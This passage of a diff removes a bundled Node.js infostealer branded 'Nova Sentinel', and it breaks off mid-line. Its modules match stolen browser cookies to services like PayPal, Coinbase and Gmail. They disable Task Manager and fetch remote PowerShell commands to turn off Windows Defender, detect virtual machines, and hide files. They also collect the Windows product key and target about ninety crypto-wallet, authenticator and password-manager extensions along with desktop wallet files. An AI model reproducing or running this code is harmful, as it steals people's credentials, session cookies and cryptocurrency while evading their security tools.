-eval("// trier les cookies\r\nconst { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\");\r\n\r\nasync function CookiesFilter(cc) {\r\n  if (cc !== \"yes\") return;\r\n  let CookiesLinks = {\r\n    \"basic-fit\": \"[`basicfit`](https://basic-fit.com)\",\r\n    coinbase: \"[`coinbase`](https://coinbase.com)\",\r\n    sellix: \"[`sellix`](https://sellix.io)\",\r\n    gmail: \"[`gmail`](https://gmail.com)\",\r\n    steam: \"[`steam`](https://steam.com)\",\r\n    riotgames: \"[`riotgames`](https://riotgames.com)\",\r\n    youtube: \"[`youtube`](https://youtube.com)\",\r\n    instagram: \"[`instagram`](https://instagram.com)\",\r\n    tiktok: \"[`tiktok`](https://tiktok.com)\",\r\n    twitter: \"[`twitter`](https://twitter.com)\",\r\n    facebook: \"[`facebook`](https://facebook.com)\",\r\n    epicgames: \"[`epicgames`](https://epicgames.com)\",\r\n    spotify: \"[`spotify`](https://spotify.com)\",\r\n    yahoo: \"[`yahoo`](https://yahoo.com)\",\r\n    roblox: \"[`roblox`](https://roblox.com)\",\r\n    twitch: \"[`twitch`](https://twitch.com)\",\r\n    minecraft: \"[`minecraft`](https://minecraft.net)\",\r\n    paypal: \"[`paypal`](https://paypal.com)\",\r\n    origin: \"[`origin`](https://origin.com)\",\r\n    amazon: \"[`amazon`](https://amazon.com)\",\r\n    ebay: \"[`ebay`](https://ebay.com)\",\r\n    aliexpress: \"[`aliexpress`](https://aliexpress.com)\",\r\n    playstation: \"[`playstation`](https://playstation.com)\",\r\n    hbo: \"[`hbo`](https://hbo.com)\",\r\n    xbox: \"[`xbox`](https://xbox.com)\",\r\n    binance: \"[`binance`](https://binance.com)\",\r\n    hotmail: \"[`hotmail`](https://hotmail.com)\",\r\n    outlook: \"[`outlook`](https://outlook.com)\",\r\n    crunchyroll: \"[`crunchyroll`](https://crunchyroll.com)\",\r\n    telegram: \"[`telegram`](https://telegram.com)\",\r\n    pornhub: \"[`pornhub`](https://pornhub.com)\",\r\n    disney: \"[`disney`](https://disney.com)\",\r\n    expressvpn: \"[`expressvpn`](https://expressvpn.com)\",\r\n    uber: \"[`uber`](https://uber.com)\",\r\n    netflix: \"[`netflix`](https://netflix.com)\",\r\n    github: \"[`github`](https://github.com)\",\r\n    stake: \"[`stake`](https://stake.com)\",\r\n  };\r\n  let CookiesKeys = [\r\n    \"basic-fit\",\r\n    \"coinbase\",\r\n    \"sellix\",\r\n    \"gmail\",\r\n    \"steam\",\r\n    \"riotgames\",\r\n    \"youtube\",\r\n    \"instagram\",\r\n    \"tiktok\",\r\n    \"twitter\",\r\n    \"facebook\",\r\n    \"epicgames\",\r\n    \"spotify\",\r\n    \"yahoo\",\r\n    \"roblox\",\r\n    \"twitch\",\r\n    \"minecraft\",\r\n    \"paypal\",\r\n    \"origin\",\r\n    \"amazon\",\r\n    \"ebay\",\r\n    \"aliexpress\",\r\n    \"playstation\",\r\n    \"hbo\",\r\n    \"xbox\",\r\n    \"binance\",\r\n    \"hotmail\",\r\n    \"outlook\",\r\n    \"crunchyroll\",\r\n    \"telegram\",\r\n    \"pornhub\",\r\n    \"disney\",\r\n    \"expressvpn\",\r\n    \"uber\",\r\n    \"netflix\",\r\n    \"github\",\r\n    \"stake\",\r\n  ];\r\n  let VerifiedLinks = new Set();\r\n  await stat.AllCookies.forEach((cookies) => {\r\n    cookies.forEach((cookie) => {\r\n      const matchingKey = CookiesKeys.find((key) => cookie.host.includes(key));\r\n\r\n      if (matchingKey) {\r\n        VerifiedLinks.add(CookiesLinks[matchingKey]);\r\n      }\r\n    });\r\n  });\r\n  let verifiedLinksArray = Array.from(VerifiedLinks);\r\n  let embed = {\r\n    avatar_url:\r\n      \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\r\n    username: \"Nova Sentinel\",\r\n    embeds: [\r\n      {\r\n        author: {\r\n          name: \"Cookies Keywords\",\r\n          url: \"https://t.me/Sordeal\",\r\n          icon_url:\r\n            \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/gifnova.gif\",\r\n        },\r\n        color: 3553599,\r\n        description: verifiedLinksArray.join(\", \"),\r\n        footer: {\r\n          text: \"@Nova Sentinel | https://t.me/Sordeal\",\r\n        },\r\n      },\r\n    ],\r\n  };\r\n  return embed;\r\n}\r\n\r\nmodule.exports = {\r\n  CookiesFilter,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/cookies.js?");
-
-/***/ }),
-
-/***/ "./utils/core.js":
-/*!***********************!*\
-  !*** ./utils/core.js ***!
-  \***********************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  util = __webpack_require__(/*! util */ \"util\"),\n  exec = util.promisify((__webpack_require__(/*! child_process */ \"child_process\").exec)),\n  execSync = util.promisify((__webpack_require__(/*! child_process */ \"child_process\").execSync)),\n  path = __webpack_require__(/*! path */ \"path\"),\n  PowerShell = __webpack_require__(/*! powershell */ \"powershell\"),\n  Winreg = __webpack_require__(/*! winreg */ \"winreg\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  disk = __webpack_require__(/*! diskusage */ \"diskusage\"),\n  diskInfo = disk.checkSync(\"/\"),\n  os = __webpack_require__(/*! os */ \"os\");\n\nfunction checkIfStartup(path) {\n  if (\n    path.includes(process.env.APPDATA) ||\n    path.includes(\"\\\\Microsoft\\\\Windows\") ||\n    path.includes(\"Startup\")\n  ) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nfunction cleaner() {\n  try {\n    fs.rmSync(stat.testpath[0], { recursive: true });\n  } catch (e) {}\n  try {\n    fs.rmSync(stat.savepath[0], { recursive: true });\n  } catch (e) {}\n}\n\n\nfunction isProcessRunning(processName, minCount) {\n  return new Promise((resolve, reject) => {\n    const command = process.platform === \"win32\" ? \"tasklist\" : \"ps aux\";\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n\n      const processes = stdout.toLowerCase();\n      const processNameLower = processName.toLowerCase();\n      const processCount = (\n        processes.match(new RegExp(processNameLower, \"g\")) || []\n      ).length;\n      resolve(processCount >= minCount);\n    });\n  });\n}\n\nfunction filterProcessesByName(name) {\n  return new Promise((resolve, reject) => {\n    const command = process.platform === \"win32\" ? \"tasklist\" : \"ps aux\";\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n      const lines = stdout.split(\"\\n\");\n      const filteredProcesses = [];\n      for (const line of lines) {\n        if (line.toLowerCase().includes(name.toLowerCase())) {\n          const columns = line.split(/\\s+/);\n          filteredProcesses.push({\n            name: columns[0],\n            pid: parseInt(columns[1]),\n            sessionName: columns[2],\n            sessionNumber: parseInt(columns[3]),\n            memoryUsage: parseInt(columns[4].replace(\",\", \"\")),\n          });\n        }\n      }\n      resolve(filteredProcesses);\n    });\n  });\n}\n\nasync function getProcessPathByPid(pid) {\n  return new Promise((resolve, reject) => {\n    const command =\n      process.platform === \"win32\"\n        ? `wmic process where processid=${pid} get ExecutablePath`\n        : `ps -p ${pid} -o comm=`;\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n      const path = stdout.trim();\n      resolve(path);\n    });\n  });\n}\n\nfunction NovaSentinelDisabTaskMNGR(cc) {\n  if (cc !== \"yes\") return;\n  const regKey = new Winreg({\n    hive: Winreg.HKCU,\n    key: \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\",\n  });\n\n  const valueName = \"DisableTaskMgr\";\n  const disableValue = 1;\n\n  regKey.set(valueName, Winreg.REG_DWORD, disableValue, (err) => {\n    if (err) {\n    } else {\n    }\n  });\n}\n\nasync function NovaSentinelDisableWinDefender(cc) {\n  if (cc !== \"yes\") return;\n\n  const powershellCommandsURL =\n    \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/disable_defender.json\";\n  try {\n    const response = await axios.get(powershellCommandsURL);\n    let g = response.data;\n    g.forEach((ge) => {\n      let ps = new PowerShell(ge);\n\n      ps.on(\"error\", (err) => {});\n\n      ps.on(\"output\", (data) => {});\n\n      ps.on(\"error-output\", (data) => {});\n\n      ps.on(\"end\", (code) => {});\n    });\n  } catch (error) {}\n}\n\nasync function NovaSentinelFindMyself() {\n  const executablePath = process.argv[0];\n  try {\n    const appDirectory = path.basename(executablePath);\n    const targetProcesses = await filterProcessesByName(\n      appDirectory.replace(\".exe\", \"\")\n    );\n    if (targetProcesses.length > 0) {\n      const targetProcess = targetProcesses[0];\n      const processPath = await getProcessPathByPid(targetProcess.pid);\n      let myself = processPath\n        .replace(\"ExecutablePath\", \"\")\n        .match(/[a-zA-Z].*[a-zA-Z]/g)\n        .join(\"\");\n      if (!fs.existsSync(myself)) {\n      } else {\n        return myself;\n      }\n    } else {\n      return \"Failed\";\n    }\n  } catch (error) {\n    return \"Failed\";\n  }\n}\n\nfunction generateId(len) {\n  var text = \"\";\n  var possible =\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\";\n  for (var i = 0; i < len; i++)\n    text += possible.charAt(Math.floor(Math.random() * possible.length));\n  return text;\n}\n\nfunction fileName(str) {\n  return str.split(\"\\\\\").pop().split(\"/\").pop();\n}\n\nfunction recursiveRead(basepath, path) {\n  var result = [];\n  if (!basepath.endsWith(\"\\\\\")) {\n    basepath += \"\\\\\";\n  }\n  const files = fs.readdirSync(basepath);\n  for (var i = 0; i < files.length; i++) {\n    const file = files[i];\n    const filePath = basepath + file;\n    if (fs.statSync(filePath).isDirectory()) {\n      result = result.concat(recursiveRead(filePath, path + file + \"\\\\\"));\n    } else {\n      result.push(path + file);\n    }\n  }\n  return result;\n}\n\nasync function checkInternetAccess() {\n  try {\n    await axios.get(\"http://www.google.com\");\n    return true;\n  } catch (error) {\n    try {\n      await axios.get(\"https://www.facebook.com\");\n      return true;\n    } catch (error) {\n      return false;\n    }\n  }\n}\n\nfunction getProfiles(path, name) {\n  const profile = path.split(\"%PROFILE%\");\n  if (profile.length == 1) {\n    return [\n      {\n        path: path,\n        name: name,\n      },\n    ];\n  }\n  if (!fs.existsSync(profile[0])) {\n    return [];\n  }\n  var dirs = fs.readdirSync(profile[0]);\n  var profiles = [];\n  for (var i = 0; i < dirs.length; i++) {\n    var dir = dirs[i];\n    if (fs.existsSync(profile[0] + dir + profile[1])) {\n      profiles.push({\n        path: profile[0] + dir + profile[1],\n        profile: name + \" \" + dir,\n      });\n    }\n  }\n\n  return profiles;\n}\n\nasync function GetTotalPhysicalMemory() {\n  const osFreeMem = os.totalmem()\n  const allFreeMem = (osFreeMem / (1024 * 1024 * 1024)).toFixed(2);\n  return Math.round(allFreeMem);\n}\n\nasync function getDisk() {\n  return (diskInfo.total / (1024 * 1024 * 1024)).toFixed(2);\n}\n\nasync function GetcleanUID() {\n  let uid = await getCommand(\"wmic csproduct get uuid\");\n  let regex_uid = /UUID\\s+([A-Fa-f0-9-]+)/;\n  let match = uid.match(regex_uid);\n  let uuid = match[1];\n  return uuid;\n}\n\nasync function getCommand(cmd) {\n  const { stdout, _ } = await exec(cmd);\n  return stdout.trim();\n}\n\nasync function GetCPUCount() {\n  return os.cpus().length;\n}\n\nasync function getInfo() {\n  try {\n    const [disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion] =\n      await Promise.all([\n        getDisk(),\n        GetTotalPhysicalMemory(),\n        GetcleanUID(),\n        GetCPUCount(),\n        await getCommand(\"wmic OS get caption, osarchitecture | more +1\"),\n        await getCommand(\"wmic cpu get name | more +1\"),\n        await getCommand(\"wmic PATH Win32_VideoController get name | more +1\"),\n        await getCommand(\n          \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        ),\n        await getCommand(\n          \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' -Name ProductName\"\n        ),\n      ]);\n    return {\n      disk,\n      ram,\n      uid,\n      cpucount,\n      OS,\n      cpu,\n      GPU,\n      windowskey,\n      windowsversion,\n    };\n  } catch (e) {\n    console.log(e)\n    if (e) {\n      return {\n        disk: \"None\",\n        ram: \"None\",\n        uid: \"None\",\n        cpucount: \"None\",\n        OS: \"None\",\n        cpu: \"None\",\n        GPU: \"None\",\n        windowskey: \"None\",\n        windowsversion: \"None\",\n      };\n    }\n  }\n}\n\nasync function getPublicIp() {\n  var data = \"\";\n  try {\n    const res = await axios({\n      url: \"https://ipinfo.io/json\",\n      method: \"GET\",\n    });\n    data = res.data;\n    if (data.length > 16) {\n      return \"Failed!\";\n    }\n    return data;\n  } catch (err) {\n    return \"Failed!\";\n  }\n}\n\nasync function antispam(running) {\n  try {\n    if (!running) return;\n    let process_name_exe = path.basename(running);\n    let result = await isProcessRunning(process_name_exe, 5);\n    if (result) {\n      process.abort();\n    }\n  } catch (e) {}\n}\n\nasync function isVm() {\n  const { stdout, _ } = await exec(\n    'powershell -c \"Get-WmiObject -Query \\\\\"Select * from Win32_CacheMemory\\\\\"\"'\n  );\n  if (stdout.replace(/\\r/gm, \"\").replace(/\\n/gm, \"\").replace(/ /gm, \"\") == \"\") {\n    return true;\n  }\n  return false;\n}\n\nfunction getHeader() {\n  return `$$\\\\   $$\\\\                                     $$$$$$\\\\                       $$\\\\     $$\\\\                     $$\\\\ \n$$$\\\\  $$ |                                   $$  __$$\\\\                      $$ |    \\\\__|                    $$ |\n$$$$\\\\ $$ | $$$$$$\\\\ $$\\\\    $$\\\\ $$$$$$\\\\        $$ /  \\\\__| $$$$$$\\\\  $$$$$$$\\\\ $$$$$$\\\\   $$\\\\ $$$$$$$\\\\   $$$$$$\\\\  $$ |\n$$ $$\\\\$$ |$$  __$$\\\\\\\\$$\\\\  $$  |\\\\____$$\\\\       \\\\$$$$$$\\\\  $$  __$$\\\\ $$  __$$\\\\\\\\_$$  _|  $$ |$$  __$$\\\\ $$  __$$\\\\ $$ |\n$$ \\\\$$$$ |$$ /  $$ |\\\\$$\\\\$$  / $$$$$$$ |       \\\\____$$\\\\ $$$$$$$$ |$$ |  $$ | $$ |    $$ |$$ |  $$ |$$$$$$$$ |$$ |\n$$ |\\\\$$$ |$$ |  $$ | \\\\$$$  / $$  __$$ |      $$\\\\   $$ |$$   ____|$$ |  $$ | $$ |$$\\\\ $$ |$$ |  $$ |$$   ____|$$ |\n$$ | \\\\$$ |\\\\$$$$$$  |  \\\\$  /  \\\\$$$$$$$ |      \\\\$$$$$$  |\\\\$$$$$$$\\\\ $$ |  $$ | \\\\$$$$  |$$ |$$ |  $$ |\\\\$$$$$$$\\\\ $$ |\n\\\\__|  \\\\__| \\\\______/    \\\\_/    \\\\_______|       \\\\______/  \\\\_______|\\\\__|  \\\\__|  \\\\____/ \\\\__|\\\\__|  \\\\__| \\\\_______|\\\\__|\n                                                                                                                  \n                                                                                                                \n      ###, ,##, ,##,\n       #  # #  # #  #\n       ###  #  # #  #\n       #  # #  # #  #\n       ###' '##' '##'\n            .--,\n           /  (\n          /    \\\\\n         /      \\\\ \n        /  0  0  \\\\\n((()   |    ()    |   ()))\n\\\\  ()  (  .____.  )  ()  /\n |\\` \\\\_/ \\\\  \\`\"\"\\`  / \\\\_/ \\`|\n |       \\`.'--'.\\`       |\n  \\\\        \\`\"\"\\`        /\n   \\\\                  /\n    \\`.              .'    ,\n     |\\`             |  _.'|\n     |              \\`-'  /\n     \\\\                 .'\n      \\`.____________.-'\n\\t\\tNovaSentinel By KSCH | https://t.me/Sordeal\\n\\n\\n\\n\n`;\n}\n\nfunction hideFile(filePath) {\n  try {\n    execSync(`powershell -Command \"attrib +h +s \\\\\"${filePath}\\\\\"\"`);\n  } catch (e) {}\n}\n\nmodule.exports = {\n  generateId,\n  antispam,\n  fileName,\n  recursiveRead,\n  getProfiles,\n  getPublicIp,\n  isVm,\n  getHeader,\n  getInfo,\n  NovaSentinelFindMyself,\n  hideFile,\n  filterProcessesByName,\n  cleaner,\n  getProcessPathByPid,\n  NovaSentinelDisableWinDefender,\n  NovaSentinelDisabTaskMNGR,\n  checkInternetAccess,\n  isProcessRunning,\n  checkIfStartup,\n};\n\n\n//# sourceURL=webpack://script/./utils/core.js?");
-
-/***/ }),
-
-/***/ "./utils/crypto.js":
-/*!*************************!*\
-  !*** ./utils/crypto.js ***!
-  \*************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n seco = __webpack_require__(/*! seco-file */ \"seco-file\"),\n core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n passworder = __webpack_require__(/*! node-passworder */ \"node-passworder\"),\n { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n { upload } = __webpack_require__(/*! ./uploadFiles */ \"./utils/uploadFiles.js\");\n\n \nclass Extension {\n  constructor(name, id) {\n    this.name = name;\n    this.id = id;\n  }\n\n  addPath(path) {\n    this.path = path;\n  }\n\n  addProfile(profile) {\n    this.profile = profile;\n  }\n}\n\nclass Cold {\n  constructor(name, existpath, stealpath) {\n    this.name = name;\n    this.existpath = existpath;\n    this.stealpath = stealpath;\n  }\n}\n\nfunction getBrowsersProfile() {\n  const local = process.env.localappdata;\n  const appdata = process.env.appdata;\n\n  const browsers_path = [\n    local +\n      \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    local + \"\\\\Google\\\\Chrome\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    appdata + \"\\\\Opera Software\\\\Opera GX Stable\\\\Local Extension Settings\",\n    appdata +\n      \"\\\\Opera Software\\\\Opera Stable\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    local +\n      \"\\\\Google\\\\Chrome Beta\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    local + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Local Extension Settings\",\n    local + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n  ];\n\n  var browsers_profile = [];\n  for (var i = 0; i < browsers_path.length; i++) {\n    const browser = browsers_path[i];\n    const profiles = core.getProfiles(browser, browser.split(\"\\\\\")[6]);\n    for (var j = 0; j < profiles.length; j++) {\n      browsers_profile.push(profiles[j]);\n    }\n  }\n\n  return browsers_profile;\n}\n\nfunction NovaSentinelExtensions(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const browsers_profile = getBrowsersProfile();\n\n    const extensions = [\n      new Extension(\"Trust Wallet\", \"egjidjbpglichdcondbcbdnbeeppgdph\"),\n      new Extension(\"Jaxx Liberty\", \"ocefimbphcgjaahbclemolcmkeanoagc\"),\n      new Extension(\"Atomic Wallet\", \"dlbmjjglhklgdodnkdlenlicpgppjcdd\"),\n      new Extension(\"Electrum\", \"hieplnfojfccegoloniefimmbfjdgcgp\"),\n      new Extension(\"Mycelium\", \"pidhddgciaponoajdngciiemcflpnnbg\"),\n      new Extension(\"Coinomi\", \"blbpgcogcoohhngdjafgpoagcilicpjh\"),\n      new Extension(\"GreenAddress\", \"gflpckpfdgcagnbdfafmibcmkadnlhpj\"),\n      new Extension(\"Edge\", \"doljkehcfhidippihgakcihcmnknlphh\"),\n      new Extension(\"BRD\", \"nbokbjkelpmlgflobbohapifnnenbjlh\"),\n      new Extension(\"Samourai Wallet\", \"apjdnokplgcjkejimjdfjnhmjlbpgkdi\"),\n      new Extension(\"Airbitz\", \"dojmlmceifkfgkgeejemfciibjehhdcl\"),\n      new Extension(\"Trezor\", \"jpxupxjxheguvfyhfhahqvxvyqthiryh\"),\n      new Extension(\"Ledger Live\", \"pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln\"),\n      new Extension(\"Ledger Wallet\", \"hbpfjlflhnmkddbjdchbbifhllgmmhnm\"),\n      new Extension(\"YubiKey\", \"mammpjaaoinfelloncbbpomjcihbkmmc\"),\n      new Extension(\"Digital Bitbox\", \"dbhklojmlkgmpihhdooibnmidfpeaing\"),\n      new Extension(\"Google Authenticator\", \"khcodhlfkpmhibicdjjblnkgimdepgnd\"),\n      new Extension(\"Microsoft Authenticator\", \"bfbdnbpibgndpjfhonkflpkijfapmomn\"),\n      new Extension(\"Authy\", \"gjffdbjndmcafeoehgdldobgjmlepcal\"),\n      new Extension(\"Duo Mobile\", \"eidlicjlkaiefdbgmdepmmicpbggmhoj\"),\n      new Extension(\"OTP Auth\", \"bobfejfdlhnabgglompioclndjejolch\"),\n      new Extension(\"Dashlane\", \"flikjlpgnpcjdienoojmgliechmmheek\"),\n      new Extension(\"FreeOTP\", \"elokfmmmjbadpgdjmgglocapdckdcpkn\"),\n      new Extension(\"Aegis Authenticator\", \"ppdjlkfkedmidmclhakfncpfdmdgmjpm\"),\n      new Extension(\"LastPass Auth\", \"cfoajccjibkjhbdjnpkbananbejpkkjb\"),\n      new Extension(\"Keeper\", \"gofhklgdnbnpcdigdgkgfobhhghjmmkj\"),\n      new Extension(\"RoboForm\", \"hppmchachflomkejbhofobganapojjol\"),\n      new Extension(\"KeePass\", \"lbfeahdfdkibininjgejjgpdafeopflb\"),\n      new Extension(\"KeePassXC\", \"kgeohlebpjgcfiidfhhdlnnkhefajmca\"),\n      new Extension(\"Bitwarden\", \"inljaljiffkdgmlndjkdiepghpolcpki\"),\n      new Extension(\"NordPass\", \"njgnlkhcjgmjfnfahdmfkalpjcneebpl\"),\n      new Extension(\"LastPass\", \"gabedfkgnbglfbnplfpjddgfnbibkmbb\"),\n      new Extension(\"CommonKey\", \"chgfefjpcobfbnpmiokfjjaglahmnded\"),\n      new Extension(\"Splikity\", \"jhfjfclepacoldmjmkmdlmganfaalklb\"),\n      new Extension(\"MicrosoftAutofill\", \"fiedbfgcleddlbcmgdigjgdfcggjcion\"),\n      new Extension(\"KeePass\", \"fmhmiaejopepamlcjkncpgpdjichnecm\"),\n      new Extension(\"KeePassXC\", \"oboonakemofpalcgghocfoadofidjkkk\"),\n      new Extension(\"MYKI Password Manager\", \"bmikpgodpkclnkgmnpphehdgcimmided\"),\n      new Extension(\"Browserpass\", \"naepdomgkenhinolocfifgehidddafch\"),\n      new Extension(\"LastPass\", \"hdokiejnpimakedhajhdlcegeplioahd\"),\n      new Extension(\"RoboForm Manager\", \"pnlccmojcmeohlpggmfnbbiapkmbliob\"),\n      new Extension(\"Metamask\", \"nkbihfbeogaeaoehlefnkodbefgpgknn\"),\n      new Extension(\"Exodus\", \"aholpfdialjgjfhomihkjbmgjidlcdno\"),\n      new Extension(\"Sollet\", \"fhmfendgdocmcbmfikdcogofphimnkno\"),\n      new Extension(\n        \"Trezor Password Manager\",\n        \"imloifkgjagghnncjkhggdhalmcnfklk\"\n      ),\n      new Extension(\"GAuth Authenticator\", \"ilgcnhelpchnceeipipijaljkblbcobl\"),\n      new Extension(\"EOS Authenticator\", \"oeljdldpnmdbchonielidgobddffflal\"),\n      new Extension(\"Authy\", \"gaedmjdfmmahhbjefcbgaolhhanlaolb\"),\n      new Extension(\"Authenticator\", \"bhghoamapcdpbohphigoooaddinpkbai\"),\n      new Extension(\"EO.Finance\", \"hoighigmnhgkkdaenafgnefkcmipfjon\"),\n      new Extension(\"TronLink\", \"ibnejdfjmmkpcnlpebklmnkoeoihofec\"),\n      new Extension(\"Coinbase\", \"hnfanknocfeofbddgcijnmhnfnkdnaad\"),\n      new Extension(\"Jaxx Liberty\", \"cjelfplplebdjjenllpjcblmjkfcffne\"),\n      new Extension(\"Guarda\", \"hpglfhgfnhbgpjdenjgmdgoeiappafln\"),\n      new Extension(\"Math\", \"afbcbjpbpfadlkmhmclhkeeodmamcflc\"),\n      new Extension(\"Binance\", \"fhbohimaelbohpjbbldcngcnapndodjp\"),\n      new Extension(\"Nifty\", \"jbdaocneiiinmjbjlgalhcelgbejmnid\"),\n      new Extension(\"Yoroi\", \"ffnbelfdoeiohenkjibnmadjiehjhajb\"),\n      new Extension(\"EQUAL\", \"blnieiiffboillknjnepogjhkgnoapac\"),\n      new Extension(\"BitApp\", \"fihkakfobkmkjojpchpfgcmhfjnmnfpi\"),\n      new Extension(\"iwallet\", \"kncchdigobghenbbaddojjnnaogfppfj\"),\n      new Extension(\"Wombat\", \"amkmjjmmflddogmhpjloimipbofnfjih\"),\n      new Extension(\"MEW CX\", \"nlbmnnijcnlegkjjpcfjclmcfggfefdm\"),\n      new Extension(\"Guild\", \"nanjmdknhkinifnkgdcggcfnhdaammmj\"),\n      new Extension(\"Ronin\", \"fnjhmkhhmkbjkkabndcnnogagogbneec\"),\n      new Extension(\"NeoLine\", \"cphhlgmgameodnhkjdmkpanlelnlohao\"),\n      new Extension(\"Clover\", \"nhnkbkgjikgcigadomkphalanndcapjk\"),\n      new Extension(\"Liquality\", \"kpfopkelmapcoipemfendmdcghnegimn\"),\n      new Extension(\"Terra Station\", \"aiifbnbfobpmeekipheeijimdpnlpgpp\"),\n      new Extension(\"Keplr\", \"dmkamcknogkgcdfhhbddcghachkejeap\"),\n      new Extension(\"Coin98\", \"aeachknmefphepccionboohckonoeemg\"),\n      new Extension(\"ZilPay\", \"klnaejjgbibmhlephnhpmaofohgkpgkd\"),\n      new Extension(\"Hycon Lite Client\", \"bcopgchhojmggmffilplmbdicgaihlkp\"),\n      new Extension(\"Nash\", \"onofpnbbkehpmmoabgpcpmigafmmnjhl\"),\n      new Extension(\"Steem Keychain\", \"jhgnbkkipaallpehbohjmkbjofjdmeid\"),\n      new Extension(\"BitClip\", \"ijmpgkjfkbfhoebgogflfebnmejmfbml\"),\n      new Extension(\"DAppPlay\", \"lodccjjbdhfakaekdiahmedfbieldgik\"),\n      new Extension(\"Auro\", \"cnmamaachppnkjgnildpdmkaakejnhae\"),\n      new Extension(\"Polymesh\", \"jojhfeoedkpkglbfimdfabpdfjaoolaf\"),\n      new Extension(\"ICONex\", \"flpiciilemghbmfalicajoolhkkenfel\"),\n      new Extension(\"Nabox\", \"nknhiehlklippafakaeklbeglecifhad\"),\n      new Extension(\"KHC\", \"hcflpincpppdclinealmandijcmnkbgn\"),\n      new Extension(\"Temple\", \"ookjlbkiijinhpmnjffcofjonbfbgaoc\"),\n      new Extension(\"TezBox\", \"mnfifefkajgofkcjkemidiaecocnkjeh\"),\n      new Extension(\"Cyano\", \"dkdedlpgdmmkkfjabffeganieamfklkm\"),\n      new Extension(\"Byone\", \"nlgbhdfgdhgbiamfdfmbikcdghidoadd\"),\n      new Extension(\"OneKey\", \"infeboajgfhgbjpjbeppbkgnabfdkdaf\"),\n      new Extension(\"Leaf\", \"cihmoadaighcejopammfbmddcmdekcje\"),\n      new Extension(\"Dashlane\", \"fdjamakpfbbddfjaooikfcpapjohcfmg\"),\n      new Extension(\"NordPass\", \"fooolghllnmhmmndgjiamiiodkpenpbb\"),\n      new Extension(\"BitWarden\", \"nngceckbapebfimnlniiiahkandclblb\"),\n    ];\n\n    var final_extensions = [];\n    for (var i = 0; i < browsers_profile.length; i++) {\n      const profile = browsers_profile[i].path;\n      for (var j = 0; j < extensions.length; j++) {\n        const extension = extensions[j];\n        const path = profile + \"\\\\\" + extension.id;\n        if (fs.existsSync(path)) {\n          extension.addPath(path);\n          extension.addProfile(profile.split(\"\\\\\")[6].replace(\" \", \"\"));\n          final_extensions.push(extension);\n        }\n      }\n    }\n\n    for (var i = 0; i < final_extensions.length; i++) {\n      const extension = final_extensions[i];\n      stat.AddExtensions(extension.name);\n      save.Save(\n        extension.path + \"\\\\\",\n        \"Wallets\",\n        \"Extensions\\\\\" + extension.name + \"-\" + extension.profile\n      );\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function NovaSentinelColds(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const appdata = process.env.appdata;\n    const local = process.env.localappdata;\n    const colds = [\n      new Cold(\"Exodus\", appdata + \"\\\\Exodus\", [\n        appdata + \"\\\\Exodus\\\\exodus.wallet\\\\\",\n        appdata + \"\\\\Exodus\\\\exodus.conf.json\",\n        appdata + \"\\\\Exodus\\\\window-state.json\",\n      ]),\n      new Cold(\"Electrum\", appdata + \"\\\\Electrum-LTC\", [\n        appdata + \"\\\\Electrum-LTC\\\\wallets\\\\\",\n      ]),\n      new Cold(\"Atomic\", appdata + \"\\\\atomic\", [\n        appdata + \"\\\\atomic\\\\Local Storage\\\\leveldb\\\\\",\n      ]),\n      new Cold(\"MultiDog\", appdata + \"\\\\MultiDog\", [\n        appdata + \"\\\\MultiDog\\\\multidoge.wallet\\\\\",\n      ]),\n      new Cold(\"Bitcoin Core\", appdata + \"\\\\Bitcoin\\\\Bitcoin Core\", [\n        appdata + \"\\\\Bitcoin\\\\Bitcoin Core\\\\wallet.dat\",\n      ]),\n      new Cold(\"Binance\", appdata + \"\\\\Binance\", [\n        appdata + \"\\\\Binance\\\\app-store.json\",\n        appdata + \"\\\\Binance\\\\Cookies\",\n      ]),\n      new Cold(\"Coinomi\", appdata + \"\\\\Coinomi\", [\n        appdata + \"\\\\Coinomi\\\\wallets\\\\\",\n      ]),\n      new Cold(\"Jax\", appdata + \"\\\\jaxx\", [\n        appdata + \"\\\\jaxx\\\\LocalStorage\\\\file_0.localstorage\",\n      ]),\n      new Cold(\"ElectronCash\", appdata + \"\\\\ElectronCash\", [\n        appdata + \"\\\\ElectronCash\\\\wallets\\\\default_wallet\",\n      ]),\n      new Cold(\"Electrum\", appdata + \"\\\\Electrum\", [\n        appdata + 